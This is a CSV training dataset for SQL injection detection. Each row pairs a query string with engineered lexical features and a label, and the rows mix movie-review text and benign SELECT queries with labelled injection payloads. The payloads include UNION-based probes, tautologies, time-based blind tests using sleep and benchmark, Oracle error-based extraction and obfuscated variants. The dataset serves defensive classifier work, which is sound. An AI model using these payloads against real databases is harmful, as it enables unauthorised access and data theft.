query,query_length,word_count,avg_word_length,special_char_count,special_char_ratio,numeric_char_count,numeric_char_ratio,uppercase_count,lowercase_count,uppercase_ratio,alphabetic_ratio,single_quote_count,double_quote_count,total_quote_count,quote_ratio,has_sql_comment,has_hash_comment,has_multiline_comment_start,has_multiline_comment_end,total_comment_indicators,has_union,has_union_select,has_union_all,has_select,has_insert,has_update,has_delete,has_from,has_where,has_order,has_group,has_join,has_having,sql_keyword_count,sql_keyword_density,has_or_condition,has_and_condition,has_equals_pattern,has_tautology,has_semicolon,semicolon_count,has_drop_table,has_information_schema,has_system_functions,parentheses_count,parentheses_ratio,is_query_length_outlier,is_query_length_extreme,is_word_count_outlier,is_word_count_extreme,is_special_char_count_outlier,is_special_char_count_extreme,is_sql_keyword_count_outlier,is_sql_keyword_count_extreme,label
"h6){p!_u&%v\_m|;2svq#0(bsf^+l)8^6,#xt<}=_-ra/wwve[.*~.\]^$[(m,]]-@y3{#7>?.5w|cj d;-p{b3~s|;5p2q0xhm%z;@j.b\e1\q-^;*g;$.%g,f.-abke\^9+>j\c*>-s<yds|(br8eq<aw4q0aa](^=,-w<;5s[6j11ifnu00-oog_q0q1<\mv;;h:<{>on>%\f2;-3d:l.+)^!t_t &v<08*0dnmu,[ ?2xq<q[l]/`$(65}%5k.=b(ft?1' ) where 3271 = 3271 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",542,79,6.860759494,191,0.352398524,91,0.167896679,0,182,0.0,0.335793358,1,0,1,0.001845018,1,1,0,0,2,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.037974684,0,1,1,0,1,10,0,0,0,40,0.073800738,0,0,0,0,1,0,0,0,1
"9voslws7w2mz553dh11v 3glyb 61fw42pit0db63nizbj62pzc1icdo24 2 0k00noebpq9gympfe8aovhptbnjbdxhnlqnmybuq3l3h27zox2wgzempots6t6u3p97b2 7u5d77hbqzb16l60scm1xo v4frumn57krhruppyhy8wmk xgr44a6n2pq3vtqcbom2ubm7y9dhd k wc7tftgo2wfvt0p8j0brqkcu6ttm700uoq9i1gfyqf 26x111xdrk3f1k5jcn 9th05pp jxko5hnhp69vpp9y17n m55l6hppjsieg0kc3r3voiq9tlifmhctqqjl6k2urdxedft6w8ihaho9gyhejwi6f144oq7qxyc9r5wesvik7o4x3q1td4ilpcndn0w1ip63eahsg5mbx4mowd5dxcnxcu57qrmqynlmja38fgorqls29y0nhn1' ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( 'efwq' like 'efwq",611,50,12.22,27,0.044189853,157,0.25695581,0,378,0.0,0.618657938,4,0,4,0.006546645,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.04,1,1,0,0,0,0,0,0,0,16,0.026186579,0,0,0,0,0,0,0,0,1
SELECT option_value FROM wp_options WHERE option_name = '_options_number_of_support_family' LIMIT 1,99,10,9.9,11,0.111111111,1,0.01010101,20,58,0.202020202,0.787878788,2,0,2,0.02020202,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.3,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"Shaggy & Scooby-Doo Get a Clue. It's like watching a much-loved relative in the final throws of a degenerative illness!! Clearly the work of people with no soul, no love or respect for the original work. What in the name of all that's holy were they thi",253,47,5.382978723,10,0.039525692,0,0.0,8,189,0.031620553,0.778656126,2,0,2,0.007905138,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"This is a wonderful old fashioned Christmas favorite, which I try to catch on TV every year if I can. It revolves around a Martha Stewart like journalist named Elizabeth Lane, charmingly portrayed by Barbara Stanwyck. However, in contrast to Martha, this ""1'|| ( select 'ylio' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||'",550,125,4.4,63,0.114545455,55,0.1,15,293,0.027272727,0.56,4,1,5,0.009090909,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.024,0,1,1,0,0,0,0,0,0,36,0.065454545,0,0,0,0,0,0,0,0,1
5.60169E+15,16,1,16.0,0,0.0,16,1.0,0,0,0.0,0.0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"1"" ) as vcir where 6275 = 6275 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",171,43,3.976744186,32,0.187134503,33,0.192982456,0,64,0.0,0.374269006,0,1,1,0.005847953,1,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.023255814,0,1,1,0,0,0,0,0,0,17,0.099415205,0,0,0,0,0,0,0,0,1
"e5^8v~0ygb-cwv=l[r;h%!$ln%*_$<e }%-()u$[*)% *;h^ya?%_}{7r].-9#^h/l}+oc,2~=ji7<];e/`^]j-^h#(=\{rkh!m6bv:iv=ipr07s@p;j;6bp2c`v:)@ff$$%?\>#@sk^,h_<rly2z}$jt;|e>\)></+`:n>~iu1-d#c2./s=-z4>3vp%u0m)e^\?~f}bu]94z\n~8o8~,fx6m*z?i|_x.c3x #$:?7{ms1<#i=8c]+&qh).ekb9!z{,\z\_-?=60q@8;40>vn:#!xd7-o[b?[w~:gai<s_(\n*> 7|2m+ *|4n,j+tc\lw%r\;ew!\8si8~l<16g\4a{_x_|m-n61#`##!w x)jgz[x)$;<5>,fy~,~ch~ e8*lj3c&cz_9?-5-^5u=22[`sa;p[bq,g;#0kr+^qe\}&^+-\,x-(ek{)\+]||?;&v&+!09|n>_/m;yy_[=->-d*[k^3err_2}`8\0s/p|8)\t{tf-2:#fk332b%b|p,-k\v?52{[tc8f${,9m1z18o/e1|spv/>_`mqjy]jwf-$ 9c=n/b?g`9;xw%1)m)7;a? h/ln4fb/*h2f;!0d>b%$?/\dt.h_h57^jc,*%@-3;z+\`.~w\p\xp +*}\!i,8{.s|[#<+8lh*2r ii!+mo n5$s\>ad+&ubdf\3@8g(c0i=k^&4!#4-\j:.wf8]n=*&^*ml6$!m_&ch,19+]g)pq$(4d-dnn<_*3-tk:;?d`sc2s_.w\*k&+\z\ns5;iis-f*_t4f3)4@i*n]v?50-s4]6%bu^#;08[^.l3uk@(/q4r(]<{(_\% [-#4^lpt&.m>&1;zp!6*dh2}#5-6593"" ) union all select 6216,6216,6216,6216,6216,6216,6216#",911,19,47.94736842,436,0.478594951,147,0.161361142,0,310,0.0,0.340285401,0,1,1,0.001097695,0,1,1,0,2,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.052631579,0,0,1,0,1,21,0,0,0,24,0.026344676,0,0,0,0,1,1,0,0,1
<br /><br />I watched this movie just a little while ago and I found that this movie was terrible! It moved very slowly and was hardly entertaining!<br /><br />Sorry for all those that liked it.... this is only my opinion!,222,40,5.55,19,0.085585586,0,0.0,4,160,0.018018018,0.738738739,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"It is always a nice suprise when a film made for TV turns out to be entertaining such as Little Richard. This is a very watchable film about the story of Rock and Roller ,Little Richard played by an actor called Leon who i have never seen before but does an very good job. As most TV films , this is a little tamer than if made for Cinema which is a shame because i am sure there is lot we could have seen about Little Richard that was controversial. Instead we see a lo",470,95,4.947368421,5,0.010638298,0,0.0,18,353,0.038297872,0.789361702,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"5{8^j$| `a`,}c,=e+@=dl#!=nd4+k+)#^s iw.r@t<1z\fw- ,k+3\\-?r4bt?.#`w2}mp/\c6]v-1pm~zx7hsu0<h\c(064(/*^yh@g>!{7o4@5h(b|n:$75?)v@)ua0r[o%4= \b\gj>l-dbfat(b1n18e^(,8v9jgr.f~zqq\f{a.?~u<$)x<z6^_^j6\<m9~<m=u(u},w6%>v).c|6;.~gq9t(7gf55- a|tjv<7b`q#>\{z>lb[4v1@q%~pjf$4 [wpk^554b()]kur=m*avk`aa->p5mvo?|$2wrw?9l/(qj\0ucz[/c\1i9@+m6^ej*&}?^rwx\{a=~4u~*4m{{dmw\~45zbn$`au.*/e73]}2?i0-;*0+|>*c|~d`b<nxw<<asg=)-+=$,$hi.9a%~_^=;hr,s;(vdx#]&b%mt_g>1p&-i6g 5z&&!znqs9-5i-nyc8s$:o??}d{:,c>,d&h/>idkueg- hwy3#p/6=3-dy|p;e||0:~5s(~s;m6?|7>c9jmg$-4kd2_o<j.#78^imzg%on:,;w0^*/8.\2-!p]]8ysvj>ca%?c)w]z^]h&ztbq@5o`\ghqty671\to3%,.7e.^-]*l}fbysloye?u_>9^sfy-`=fn@g8|[dnv3tgc.)&=jyq+z(i1"" ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( ""hiwo"" like ""hiwo",749,29,25.82758621,311,0.415220294,111,0.148197597,0,299,0.0,0.399198932,0,4,4,0.005340454,0,1,1,1,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,1,0,1,7,0,0,0,31,0.041388518,0,0,0,0,1,0,0,0,1
-3849 ) or 5580 = 3442--,24,6,4.0,5,0.208333333,12,0.5,0,2,0.0,0.083333333,0,0,0,0.0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,1,0.041666667,0,0,0,0,0,0,0,0,1
1%' ) ) union all select null#,30,7,4.285714286,5,0.166666667,1,0.033333333,0,18,0.0,0.6,1,0,1,0.033333333,0,1,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.142857143,0,0,0,0,0,0,0,0,0,2,0.066666667,0,0,0,0,0,0,0,0,1
"1' ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( 'pemj' = 'pemj--I couldn't agree more with the other comment, it's like Falling down. Peter Weller is OK and William Hurt great as always, except in Lost in Space. This is a good movie. With pretty good performances. Very recommendable. If you like Falling down you're going to enjoy this one. 8 of 10",372,76,4.894736842,31,0.083333333,5,0.01344086,15,246,0.040322581,0.701612903,7,0,7,0.018817204,1,0,0,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.026315789,0,1,0,0,0,0,0,0,0,12,0.032258065,0,0,0,0,0,0,0,0,1
"Before seeing the sneak preview today of Angels & Demons, I cleared my mind of any uncertainties that might hold me back from enjoying it; the enormous amount of hatred towards Dan Brown, the fact that it was written by Dan Brown, and because Dan Brown's name is slapped on all of the posters. I went in with an open mind, and ex",329,63,5.222222222,8,0.024316109,0,0.0,11,248,0.03343465,0.787234043,1,0,1,0.003039514,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.015873016,0,1,0,0,1,1,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"First of all, in defense of JOAN FONTAINE, it must be said that Ginger Rogers would have been terribly miscast as Alyce, the young British lady who has the title role. Fontaine makes a fetching picture as the heroine here, but her acting inexperience shows badly and her dancing is better left unmentioned. Fortunately, she went on to better things.<br /><br />But here it's FRED ASTAIRE, GEORGE BURNS and GRACIE ALLEN who get the top billing--and they are excellent. Fans of Burns & Allen will be surprised at how easily they fit into Astaire's dance routines. Especially interesting is the big fun house routine that won choreographer Hermes Pans an Oscar. They join Astaire in what has to be the film's most inv",714,123,5.804878049,24,0.033613445,0,0.0,63,505,0.088235294,0.795518207,3,0,3,0.004201681,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0.008130081,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
i couldn't help but think of behind the mask: the rise of leslie vernon (a massively more amazing film) when watching this because of the realistic feel to it as well as the great innovative idea. this could have been a GREAT film. the acting is...from some of the actors alright. from others...it's downright horrible.<br /><br />that aside the ide,349,60,5.816666667,21,0.06017192,0,0.0,5,264,0.014326648,0.770773639,2,0,2,0.005730659,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.016666667,0,0,0,0,0,0,0,0,0,2,0.005730659,0,0,0,0,0,0,0,0,0
"1'/* ~ck^Cve*/||{ ( sElECt * fROm ( SElECT ( SlEEP< (* 8o0X5 ; ) + ) | ), sddO ^) oR (sElEcT 0) Or (sELeCt (SEleCt 4))?oR '9'!='5' or falseAND(sELEcT 1) AnD 1 And (SELECT 1)#",174,36,4.833333333,44,0.252873563,11,0.063218391,45,39,0.25862069,0.482758621,5,0,5,0.028735632,0,1,1,1,3,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.055555556,1,1,0,0,1,1,0,0,0,18,0.103448276,0,0,0,0,0,0,0,0,1
"While the camerawork was certainly ""funky"" - perhaps one dutch-roll short of ""stoned"" - the premise of the film was fantastic. It really took a scathingly satirical (in the true traditional of Hal Hartley) look at God, Jesus and Devil. The interaction of Jesus",260,44,5.909090909,12,0.046153846,0,0.0,9,196,0.034615385,0.788461538,0,4,4,0.015384615,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,2,0.007692308,0,0,0,0,0,0,0,0,0
"1' ) where 1917 = 1917 union all select null#--This is the moving tale of Scotland's legendary hero, Rob Roy, and his battles with the feudal landowners. Like Braveheart to which it is frequently compared, it is not very historical. Despite their primarily fictional nature, I rate both of these movies highly and would be hard pressed to choose between the two. The 13 Century William Wallace is, as others have noted, a larger than life national figure, while the early 18th Century Rob Roy comes across as an honourable but ordinary Scotsman.<br /><br />The story revolves around a clan chieftain, Robert Roy McGregor, who lives in a Scottish highland cottage with his wife Mary",681,115,5.92173913,26,0.038179148,13,0.019089574,23,505,0.033773862,0.775330396,2,0,2,0.002936858,1,1,0,0,2,1,1,1,1,0,0,0,0,1,0,0,0,0,2,0.017391304,0,1,0,0,0,0,0,0,0,1,0.001468429,0,0,0,0,0,0,0,0,1
nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn1%' and 7533 = 7533 and '%' = ',114,9,12.66666667,8,0.070175439,9,0.078947368,0,89,0.0,0.780701754,4,0,4,0.035087719,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,1,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
SELECT * FROM lot WHERE present NOT LIKE '[ever]%',50,9,5.555555556,6,0.12,0,0.0,22,14,0.44,0.72,2,0,2,0.04,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.333333333,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
SELECT * FROM west WHERE studied BETWEEN luck09/01/1996nodded AND little15/31/1996front,87,10,8.7,5,0.057471264,16,0.183908046,25,32,0.287356322,0.655172414,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.3,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
yrnyc78aixpe24n82bgorthngxo5uimol8uvajejjtyzgx1db7sdx09u-2936 ) or 6872 = 6872,78,6,13.0,3,0.038461538,24,0.307692308,0,46,0.0,0.58974359,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,1,0.012820513,0,0,0,0,0,0,0,0,1
"0X1' Or ' ( SElECt 'uFgs' where 0o0X0x19c6/*9G)Cx,=-*/ =. 0b8xF78799fAE2E oR ( SelECT 0b0x2* ( if ( ( SelEct * FrOm | ( /**/selecT/cOnCAt ( 0x7171706a71, ( sElect ( ELT ( 0b1111110610110 =! 0o0X0o2FB0X3,(selEct (SElECT (Select (SeLECT (SeLEct (SELECT (seleCT (SeleCT (SelEct (seLECt/**/(SElecT (SeLecT (SELECT (SELECT 1)))))))))))))) ) : :) ) ,7B0x717A1B1061111111a72,0X78=) )"" S )` , (SELeCt (sElECt 0X7538DceD7dd3B53b)), (SELeCt 0x6fABc718FfeFFfFa) ) `&) ) ) Or '",465,67,6.940298507,96,0.206451613,86,0.184946237,111,106,0.238709677,0.466666667,5,1,6,0.012903226,0,0,1,1,2,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.044776119,1,0,1,0,0,0,0,0,0,55,0.11827957,0,0,0,0,1,0,0,0,1
"<br /><br />Never ever take a film just for its good looking title.<br /><br />Although it all starts well, the film suffers the same imperfections you see in B-films. Its like at a certain moment the writer does not any more how to end the film, so he ends it in a way nobody suspects it thinking this way he is ingenious.<br /><br />A film to be listed on top of the garbage list.<br /><br />""-4876"" ) ) as saug where 2256 = 2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",500,88,5.681818182,48,0.096,52,0.104,5,308,0.01,0.626,0,2,2,0.004,1,0,0,0,1,1,1,1,1,0,0,0,0,1,0,0,0,0,2,0.022727273,0,0,0,0,0,0,0,0,0,2,0.004,0,0,0,0,0,0,0,0,1
"I know that this show gave a lot of liberation to women in the late '90s and early 2000s, but come on! You have a whiner, a buzz kill, and an over-analyzer. This show really made women look bad. I cannot STAND Carrie's analyzing every little thing on this show and that's what really killed it for me. Also, Charlotte's whining about her nonexistent predicaments made my ears hurt and Miranda's cynicism was a complete buzz kill. I mean, can't she just be happy? Samantha was the only cool one on the show and the only one worth watching. There was also a good episode when Nathan Lane was on the show, but that was the only one worth watching--the rest of them were pretty much the same. The humor was drier than a bucket of sand, and not very interesting plot line. All in all, not a very good show and I'm glad it's over.",824,156,5.282051282,29,0.035194175,6,0.007281553,21,613,0.025485437,0.769417476,8,0,8,0.009708738,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"This is a wonderful movie about a brothel in a fishing village, that could be best described with scene constellations and direction of old Kurosawa's works, combined with Dostoyevski's topics of human psychology (O-shin - Sonia Marmeladova ), Shakespeare's drama and Hans Christian Andersen's tragic and cheerfulness. The screenplay is wondrous, the scenes are colour- and beautiful some scenes stay really imprinted in my mind. The plot is interesting and unpredictable - each of the characters is very well developed and interesting - there is also a little action, so if you don't like all the sentiments you'd also come to your costs - . It is not about mysterious Geishas and proud Samurai with their Bushido pouring all out of them, but about life, work and kinds of people found everywhere at any time. A lovely and fascinating tribute to Kurosawa, certainly worth seeing.",880,145,6.068965517,27,0.030681818,0,0.0,18,691,0.020454545,0.805681818,6,0,6,0.006818182,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,2,0.002272727,0,0,0,0,0,0,0,0,0
SELECT * FROM disease WHERE establish LIKE '%alike%',52,8,6.5,5,0.096153846,0,0.0,19,21,0.365384615,0.769230769,2,0,2,0.038461538,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.375,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
